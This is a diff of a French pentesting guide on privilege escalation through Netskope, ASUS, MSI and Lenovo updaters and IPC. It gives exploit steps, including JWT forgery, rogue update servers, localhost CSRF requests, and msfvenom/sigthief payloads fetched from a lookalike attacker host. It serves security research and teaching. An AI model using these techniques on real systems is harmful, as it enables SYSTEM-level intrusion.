@@ -1,28 +1,28 @@
-# Abus de Enterprise Auto-Updaters et de Privileged IPC (par ex., Netskope, ASUS & MSI)
+# Abuser des Enterprise Auto-Updaters et de l’IPC privilégié (par ex., Netskope, ASUS et MSI)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Cette page généralise une classe de chaînes Windows local privilege escalation trouvées dans des agents endpoint d’entreprise et des updaters qui exposent une surface IPC peu contraignante et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faible privilège peut contraindre l’enrôlement vers un serveur contrôlé par l’attaquant puis livrer un MSI malveillant que le service SYSTEM installe.
+Cette page généralise une catégorie de chaînes d’élévation de privilèges locale Windows trouvées dans les agents endpoint et les updaters d’entreprise qui exposent une surface IPC facilement exploitable et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur disposant de faibles privilèges peut forcer l’enrôlement vers un serveur contrôlé par l’attaquant, puis fournir un MSI malveillant que le service SYSTEM installe.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
 
-Idées clés que vous pouvez réutiliser contre des produits similaires :
-- Abuse d’un localhost IPC d’un service privilégié pour forcer le ré-enrôlement ou la reconfiguration vers un serveur attaquant.
-- Implémentez les endpoints de mise à jour du vendor, livrez un Trusted Root CA rogue, et pointez l’updater vers un package malveillant, “signed”.
-- Contournez les vérifications faibles de signer (CN allow-lists), les drapeaux de digest optionnels, et les propriétés MSI laxistes.
-- Si l’IPC est “encrypted”, dérivez la key/IV à partir d’identifiants machine lisibles par tous stockés dans le registry.
-- Si le service restreint les appelants par image path/process name, injectez-vous dans un process allow-listed ou lancez-en un en état suspended et initialisez votre DLL via un patch minimal du thread-context.
+Idées clés réutilisables contre des produits similaires :
+- Abuser de l’IPC localhost d’un service privilégié pour forcer un nouvel enrôlement ou une reconfiguration vers un serveur contrôlé par l’attaquant.
+- Implémenter les endpoints de mise à jour du fournisseur, fournir un rogue Trusted Root CA et faire pointer l’updater vers un package malveillant, « signed ».
+- Contourner les vérifications faibles du signer (CN allow-lists), les flags de digest optionnels et les propriétés MSI permissives.
+- Si l’IPC est « encrypted », dériver la clé/IV à partir d’identifiants machine lisibles par tous et stockés dans le registre.
+- Si le service restreint les appelants selon le chemin de l’image ou le nom du processus, injecter le code dans un processus autorisé ou en démarrer un en état suspended, puis charger votre DLL via un patch minimal du contexte d’un thread.
 
 ---
-## 1) Forcer l’enrôlement vers un serveur attaquant via localhost IPC
+## 1) Forcer l’enrôlement vers un serveur contrôlé par l’attaquant via l’IPC localhost
 
-Beaucoup d’agents embarquent un process UI en mode user qui communique avec un service SYSTEM via localhost TCP en utilisant JSON.
+De nombreux agents fournissent un processus d’interface utilisateur en mode user qui communique avec un service SYSTEM via TCP localhost en utilisant JSON.
 
 Observé dans Netskope :
-- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
-- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN
+- UI : stAgentUI (low integrity) ↔ Service : stAgentSvc (SYSTEM)
+- IPC command ID 148 : IDP_USER_PROVISIONING_WITH_TOKEN
 
-Flux d’exploitation :
-1) Fabriquez un jeton d’enrôlement JWT dont les claims contrôlent le backend host (par ex., AddonUrl). Utilisez alg=None afin qu’aucune signature ne soit requise.
-2) Envoyez le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
+Exploit flow :
+1) Créer un token d’enrôlement JWT dont les claims contrôlent l’hôte backend (par ex., AddonUrl). Utiliser alg=None afin qu’aucune signature ne soit requise.
+2) Envoyer le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
 ```json
 {
 "148": {
@@ -31,82 +31,82 @@ Flux d’exploitation :
 }
 }
 ```
-3) Le service commence à contacter votre rogue server pour l’inscription/config, par ex. :
+3) Le service commence à contacter votre serveur rogue pour l’inscription/la configuration, par exemple :
 - /v1/externalhost?service=enrollment
 - /config/user/getbrandingbyemail
 
 Notes :
-- Si la vérification de l’appelant est basée sur le path/nom, faites partir la requête d’un binaire vendor allow-listed (voir §4).
+- Si la vérification de l’appelant repose sur le chemin/le nom, initiez la requête depuis un binaire fournisseur autorisé (voir §4).<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
-## 2) Hijacking le canal de mise à jour pour exécuter du code en tant que SYSTEM
+## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM
 
-Une fois que le client parle à votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI attaquant. Séquence typique :
+Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI contrôlé par l’attaquant. Séquence typique :
 
-1) /v2/config/org/clientconfig → Retournez une config JSON avec un intervalle updater très court, par ex. :
+1) /v2/config/org/clientconfig → Retournez une configuration JSON avec un intervalle de mise à jour très court, par exemple :
 ```json
 {
 "clientUpdate": { "updateIntervalInMin": 1 },
 "check_msi_digest": false
 }
 ```
-2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le magasin Local Machine Trusted Root.
-3) /v2/checkupdate → Fournir des métadonnées pointant vers un MSI malveillant et une fausse version.
+2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l’installe dans le magasin Trusted Root de la machine locale.
+3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.
 
-Bypassing common checks seen in the wild:
-- Signer CN allow-list: le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre rogue CA peut émettre un leaf avec ce CN et signer le MSI.
-- CERT_DIGEST property: inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune enforcement à l’installation.
-- Optional digest enforcement: le flag de config (par ex. check_msi_digest=false) désactive la validation cryptographique supplémentaire.
+Contournement des vérifications courantes observées dans la nature :
+- Allow-list du CN du signataire : le service peut uniquement vérifier que le Subject CN est égal à « netSkope Inc » ou « Netskope, Inc. ». Votre rogue CA peut émettre un certificat leaf avec ce CN et signer le MSI.
+- Propriété CERT_DIGEST : inclure une propriété MSI inoffensive nommée CERT_DIGEST. Aucune vérification n'est effectuée lors de l'installation.
+- Vérification facultative du digest : un flag de configuration (par exemple, check_msi_digest=false) désactive la validation cryptographique supplémentaire.
 
-Result: le service SYSTEM installe votre MSI depuis
+Résultat : le service SYSTEM installe votre MSI depuis
 C:\ProgramData\Netskope\stAgent\data\*.msi
-exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.
+et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Patch-bypass lesson: si un vendor répond en allow-listant un petit ensemble de domaines “trusted” au lieu d’authentifier cryptographiquement la source de mise à jour, cherchez des redirecteurs appartenant au vendor ou des reverse proxies qui vous permettent encore d’orienter le trafic. Dans le cas de Netskope, des recherches de suivi publiques ont montré qu’un allow-list de l’ère R129 pouvait encore être abusé via `rproxy.goskope.com`, qui relayait du contenu Azure App Service contrôlé par l’attaquant. Traitez les hostname allow-lists comme un ralentisseur, pas comme une trust boundary.
+Leçon sur le contournement des patchs : si un vendor réagit en ajoutant une petite liste d'allow-list de domaines « de confiance » au lieu d'authentifier cryptographiquement la source de l'update, recherchez des redirectors ou reverse proxies appartenant au vendor qui permettent toujours de diriger le trafic. Dans le cas de Netskope, des recherches publiques ultérieures ont montré qu'une allow-list datant de l'ère R129 pouvait toujours être exploitée via `rproxy.goskope.com`, qui faisait office de proxy pour du contenu Azure App Service contrôlé par un attaquant. Considérez les allow-lists de hostnames comme un simple ralentissement, et non comme une trust boundary.<sup>[[14]](#references)</sup>
 
 ---
 ## 3) Forging encrypted IPC requests (when present)
 
-Depuis R127, Netskope enveloppait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reverse engineering a montré un AES avec une key/IV dérivée de valeurs de registre lisibles par n’importe quel user :
+À partir de R127, Netskope encapsulait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reversing a montré l'utilisation d'AES, avec une clé et un IV dérivés de valeurs du registry lisibles par n'importe quel utilisateur :
 - Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
 - IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID
 
-Les attackers peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un standard user. Conseil général : si un agent “encrypts” soudainement son IPC, cherchez des device IDs, des GUID de produit, des install IDs sous HKLM comme matériel.
+Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard.<sup>[[1]](#references)[[2]](#references)</sup> Conseil général : si un agent commence soudainement à « chiffrer » son IPC, recherchez des device IDs, product GUIDs et install IDs sous HKLM pouvant servir de matériau.
 
 ---
 ## 4) Bypassing IPC caller allow-lists (path/name checks)
 
-Certains services essaient d’authentifier le peer en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image aux binaries vendor allow-listed situés sous Program Files (par ex. stagentui.exe, bwansvc.exe, epdlp.exe).
+Certains services tentent d'authentifier le peer en résolvant le PID de la connexion TCP et en comparant le path/name de l'image à des binaires du vendor présents dans une allow-list sous Program Files (par exemple, stagentui.exe, bwansvc.exe, epdlp.exe).
 
-Deux bypasses pratiques :
-- DLL injection dans un processus allow-listed (par ex. nsdiag.exe) et proxy IPC depuis l’intérieur.
-- Lancer un binary allow-listed suspendu et bootstrap votre proxy DLL sans CreateRemoteThread (voir §5) pour satisfaire les driver-enforced tamper rules.
+Deux contournements pratiques :
+- DLL injection dans un processus présent dans l'allow-list (par exemple, nsdiag.exe), puis proxy IPC depuis celui-ci.
+- Lancer un binaire présent dans l'allow-list en état suspended et amorcer votre proxy DLL sans CreateRemoteThread (voir §5) afin de satisfaire les règles anti-tamper imposées par le driver.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
 ## 5) Tamper-protection friendly injection: suspended process + NtContinue patch
 
-Les produits livrent souvent un driver minifilter/OB callbacks (par ex. Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
-- Process: supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
-- Thread: limite à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE
+Les produits intègrent souvent un driver minifilter/OB callbacks (par exemple, Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
+- Processus : retire PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
+- Thread : limite les droits à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE
 
 Un loader user-mode fiable qui respecte ces contraintes :
-1) CreateProcess d’un binary vendor avec CREATE_SUSPENDED.
-2) Obtenir les handles auxquels vous avez encore droit : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, et un thread handle avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou seulement THREAD_RESUME si vous patch code à un RIP connu).
-3) Écraser ntdll!NtContinue (ou un autre thunk précoce, garanti mappé) avec un petit stub qui appelle LoadLibraryW sur le path de votre DLL, puis revient.
-4) ResumeThread pour déclencher votre stub in-process, chargeant votre DLL.
+1) CreateProcess d'un binaire du vendor avec CREATE_SUSPENDED.
+2) Obtenir les handles encore autorisés : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, ainsi qu'un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou simplement THREAD_RESUME si vous patchez le code à un RIP connu).
+3) Écraser ntdll!NtContinue (ou un autre thunk précoce dont le mapping est garanti) avec un petit stub qui appelle LoadLibraryW sur le path de votre DLL, puis revient à l'emplacement d'origine.
+4) ResumeThread pour déclencher votre stub in-process et charger votre DLL.
 
-Parce que vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un process déjà protégé (vous l’avez créé), la policy du driver est satisfaite.
+Comme vous n'avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l'avez créé), la policy du driver est respectée.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ---
 ## 6) Practical tooling
-- NachoVPN (plugin Netskope) automatise un rogue CA, la signature d’un MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
-- UpSkope est un client IPC custom qui fabrique des messages IPC arbitraires (optionnellement chiffrés AES) et inclut l’injection de process suspendu pour provenir d’un binary allow-listed.
+- NachoVPN (Netskope plugin) automatise la création d'un rogue CA, la signature d'un MSI malveillant et le service des endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
+- UpSkope est un client IPC custom qui fabrique des messages IPC arbitraires (éventuellement chiffrés avec AES) et inclut l'injection dans un processus suspended afin d'émettre les messages depuis un binaire présent dans l'allow-list.<sup>[[4]](#references)</sup>
 
 ## 7) Fast triage workflow for unknown updater/IPC surfaces
 
-Lorsqu’on fait face à un nouvel endpoint agent ou à une suite “helper” de motherboard, un workflow rapide suffit généralement à déterminer si vous avez affaire à une cible de privesc prometteuse :
+Lorsqu'on examine un nouvel endpoint agent ou une suite de « helper » pour motherboard, un workflow rapide suffit généralement à déterminer si l'on est face à une cible prometteuse de privesc :<sup>[[6]](#references)</sup>
 
-1) Énumérer les listeners loopback et les rattacher aux processes vendor :
+1) Énumérer les listeners loopback et les relier aux processus du vendor :
 ```powershell
 Get-NetTCPConnection -State Listen |
 Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
@@ -117,42 +117,42 @@ Select-Object LocalAddress,LocalPort,OwningProcess,
 ```powershell
 [System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
 ```
-3) Extraire les données de routage appuyées par le registre utilisées par les serveurs IPC basés sur des plugins:
+3) Extraire les données de routage adossées au registre utilisées par les serveurs IPC basés sur des plugins :
 ```powershell
 Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
 Select-Object PSChildName
 ```
-4) Extraire d'abord les noms des endpoints, les clés JSON et les IDs de commande depuis le client en user-mode. Les frontends Electron/.NET packés divulguent fréquemment le schéma complet :
+4) Extrayez d'abord les noms des endpoints, les clés JSON et les identifiants de commande depuis le client en mode utilisateur. Les frontends Electron/.NET packagés révèlent fréquemment l'intégralité du schéma :
 ```powershell
 Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
 -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
 ```
-5) Cherchez le prédicat de confiance réel, pas seulement le chemin de code qui finit par lancer le processus :
+5) Recherchez le véritable prédicat de confiance, et pas seulement le chemin d’exécution qui finit par lancer le processus :
 ```powershell
 Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
 -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
 ```
-Patterns worth prioritizing:
-- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
-- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
-- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
-- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.
+Motifs à prioriser :
+- L’utilisation de `CryptQueryObject`/certificate parsing sans `WinVerifyTrust` signifie généralement que « le certificat existe » a été interprété comme « le certificat est approuvé », permettant le certificate cloning ou d’autres fake-signer tricks.
+- Les vérifications par sous-chaîne ou suffixe sur `Origin`, `Referer`, les download URLs, les process names ou les signer CNs ne constituent pas une authentification. `contains(".vendor.com")` est généralement exploitable avec des lookalike domains contrôlés par l’attaquant.
+- Si le low-privileged GUI décide que « le fichier est approuvé » et que le SYSTEM broker se contente de consommer ce résultat, patcher ou réimplémenter la DLL/JS côté client contourne souvent entièrement la boundary (split validation de type Razer).
+- Si le broker copie un payload vers `%TEMP%`/`C:\Windows\Temp`, puis le valide ou le planifie depuis ce chemin, testez immédiatement les fenêtres de remplacement TOCTOU ainsi que les sibling plugin modules qui exposent d’autres wrappers `ExecuteTask()` avec des vérifications plus faibles.<sup>[[6]](#references)</sup>
 
-For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.
+Pour les targets fortement basées sur les named pipes, PipeViewer permet d’identifier rapidement les DACL faibles et les pipes accessibles à distance avant de commencer à reverse le protocole en profondeur.<sup>[[11]](#references)</sup>
 
-If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.
+Si la target authentifie les callers uniquement par PID, image path ou process name, considérez cela comme un ralentissement plutôt que comme une boundary : injecter du code dans le client légitime ou effectuer la connexion depuis un allow-listed process suffit souvent à satisfaire les checks du serveur. Pour les named pipes en particulier, [cette page consacrée à la client impersonation et au pipe abuse](named-pipe-client-impersonation.md) décrit plus en détail ce primitive.
 
 ---
-## 8) Brokers d’add-ins modulaires authentifiés uniquement par des signatures de vendor (Lenovo Vantage pattern)
+## 8) Modular add-in brokers authentifiés uniquement par les signatures du vendor (pattern Lenovo Vantage)
 
-Une variation plus récente à rechercher est le **signed-client RPC broker** : un processus desktop Lenovo signé et à faible privilège communique avec un service SYSTEM, et le service route des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Une fois l’exécution de code obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de votre surface d’attaque.
+Une variation plus récente à rechercher est le **signed-client RPC broker** : un processus desktop Lenovo-signed avec de faibles privilèges communique avec un service SYSTEM, et le service route des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Dès qu’une code execution est obtenue **dans n’importe quel signed client accepté**, chaque contrat `runas="system"` fait partie de votre attack surface.<sup>[[15]](#references)</sup>
 
-Primitives à forte valeur observées dans la recherche sur Lenovo Vantage :
-- **Faire confiance à l’appelant parce qu’il est signé par le vendor** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé Lenovo dans un répertoire inscriptible et en satisfaisant un DLL side-load (`profapi.dll`) afin que du code arbitraire s’exécute dans un client déjà approuvé par le service.
-- **Découverte de la surface d’attaque pilotée par manifeste** : les add-ins sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en `SYSTEM`, donc l’énumération de ces manifests révèle souvent les véritables verbes privilégiés plus vite que l’ingénierie inverse du broker lui-même.
-- **Bugs par commande derrière le canal authentifié** : une fois à l’intérieur du client de confiance, la recherche publique a trouvé des path-traversal + race conditions dans des verbes d’update/install, un abus de raw-SQL dans des bases de données de paramètres privilégiés, et des vérifications de chemins de registre basées sur des sous-chaînes qui permettaient des écritures en dehors de la ruche prévue.
+Primitives à forte valeur observées lors des recherches sur Lenovo Vantage :
+- **Faire confiance au caller parce qu’il est signé par le vendor** : des researchers ont obtenu un contexte authentifié en copiant un EXE Lenovo-signed vers un répertoire writable et en satisfaisant un DLL side-load (`profapi.dll`), ce qui permettait d’exécuter du code arbitraire dans un client déjà approuvé par le service.
+- **Découverte de l’attack surface pilotée par les manifests** : les add-ins sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contracts s’exécutent en tant que `SYSTEM`, donc l’énumération de ces manifests révèle souvent les privileged verbs réels plus rapidement que le reverse du broker lui-même.
+- **Bugs par commande derrière le canal authentifié** : une fois dans le trusted client, des recherches publiques ont mis en évidence du path traversal + des race conditions dans les update/install verbs, du raw-SQL abuse dans des privileged settings databases et des vérifications de registry paths basées sur des sous-chaînes qui permettaient des écritures en dehors de la hive prévue.
 
-Recon utile sur une cible :
+Recon utile sur une target :
 ```powershell
 Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
 Select-String -Pattern 'runas="system"|<name>|<namespace>'
@@ -162,17 +162,17 @@ Select-String -Pattern 'runas="system"|<name>|<namespace>'
 Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
 -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
 ```
-Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.
+Conclusion pratique : lorsqu’une suite d’outils auxiliaires expose un broker qui authentifie d’abord le **caller process**, puis distribue les requêtes vers des dizaines de commandes de plugins/add-ins, ne vous arrêtez pas après avoir contourné le contrôle de confiance initial. Extrayez la table du manifest/contract et fuzz chaque verbe à privilèges élevés indépendamment ; le canal authentifié dissimule généralement plusieurs bugs de second niveau.
 
 ---
-## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)
+## 1) CSRF browser-to-localhost contre des APIs HTTP privilégiées (ASUS DriverHub)
 
-DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.
+DriverHub fournit un service HTTP en user-mode (ADU.exe) sur 127.0.0.1:53000 qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d’origine effectue simplement un `string_contains(".asus.com")` sur le header Origin et sur les URLs de téléchargement exposées par `/asus/v1.0/*`. N’importe quel host contrôlé par un attaquant, tel que `https://driverhub.asus.com.attacker.tld`, passe donc le contrôle et peut envoyer des requêtes modifiant l’état depuis JavaScript.<sup>[[6]](#references)</sup> Voir [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour d’autres méthodes de contournement.
 
-Practical flow:
-1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
-2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
-3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
+Déroulement pratique :
+1) Enregistrez un domaine contenant `.asus.com` et hébergez-y une page web malveillante.
+2) Utilisez `fetch` ou XHR pour appeler un endpoint privilégié (par exemple, `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
+3) Envoyez le corps JSON attendu par le handler ; le JS frontend empaqueté affiche le schéma ci-dessous.
 ```javascript
 fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
 method: "POST",
@@ -180,89 +180,89 @@ headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
 });
 ```
-Même l’interface PowerShell CLI montrée ci-dessous réussit lorsque l’en-tête Origin est usurpé avec la valeur de confiance :
+Même la CLI PowerShell présentée ci-dessous réussit lorsque l’en-tête Origin est usurpé avec la valeur approuvée :
 ```powershell
 Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
 -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
 -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
 ```
-Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.
+Toute visite du navigateur sur le site de l’attaquant devient donc un CSRF local en 1 clic (ou en 0 clic via `onload`) qui contrôle un helper SYSTEM.
 
 ---
-## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)
+## 2) Vérification insecure de la signature du code et clonage de certificat (ASUS UpdateApp)
 
-`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne, donc `http://updates.asus.com.attacker.tld:8000/payload.exe` est acceptée. Après le téléchargement, ADU.exe vérifie seulement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – aucun `WinVerifyTrust`, aucune validation de chaîne.
+`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de recherche de sous-chaîne ; `http://updates.asus.com.attacker.tld:8000/payload.exe` est donc accepté. Après le téléchargement, ADU.exe vérifie simplement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – sans `WinVerifyTrust` ni validation de chaîne.
 
-Pour weaponize the flow :
-1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
-2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
-3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.
+Pour weaponize le flux :
+1) Créer un payload (par exemple, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
+2) Cloner le signer ASUS dans celui-ci (par exemple, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
+3) Héberger `pwn.exe` sur un domaine ressemblant à `.asus.com` et déclencher UpdateApp via le CSRF du navigateur ci-dessus.
 
-Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.
+Comme les filtres Origin et URL sont tous deux basés sur des sous-chaînes et que la vérification du signer compare uniquement des chaînes, DriverHub télécharge et exécute le binaire de l’attaquant avec son contexte privilégié.<sup>[[6]](#references)</sup>
 
 ---
-## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)
+## 1) TOCTOU dans les chemins de copie/exécution de l’updater (MSI Center CMD_AutoUpdateSDK)
 
-Le service SYSTEM de MSI Center expose un protocole TCP où chaque frame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
+Le service SYSTEM de MSI Center expose un protocole TCP dans lequel chaque trame est composée de `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
 1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
-2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL, CO., LTD.” et `WinVerifyTrust` doit réussir).
+2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le subject du certificat doit être égal à “MICRO-STAR INTERNATIONAL CO., LTD.” et `WinVerifyTrust` doit réussir).
 3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.
 
 Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
-- Envoyer Frame A pointant vers un binaire légitime signé MSI (garantit que la vérification de signature passe et que la tâche est mise en file d’attente).
-- Le concurrencer avec des messages Frame B répétés qui pointent vers un payload malveillant, en écrasant `MSI Center SDK.exe` juste après la fin de la vérification.
+- Envoyer la trame A en indiquant un binaire légitime signé par MSI (ce qui garantit que la vérification de signature réussit et que la tâche est mise en file d’attente).
+- La mettre en concurrence avec des messages de trame B répétés qui indiquent un payload malveillant et écrasent `MSI Center SDK.exe` juste après la fin de la vérification.
 
-Quand le scheduler se déclenche, il exécute le payload écrasé sous SYSTEM malgré la validation du fichier original. Une exploitation fiable utilise deux goroutines/threads qui spamment CMD_AutoUpdateSDK jusqu’à gagner la fenêtre TOCTOU.
-
----
-## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)
-
-### MSI Center TCP command sets
-- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers bytes d’une frame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
-- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune** validation de signature – n’importe quel utilisateur local peut le pointer vers `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM déterministe.
-- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients Go/ Python personnalisés peuvent ensuite rejouer les frames.
-
-### Acer Control Centre named pipes & impersonation levels
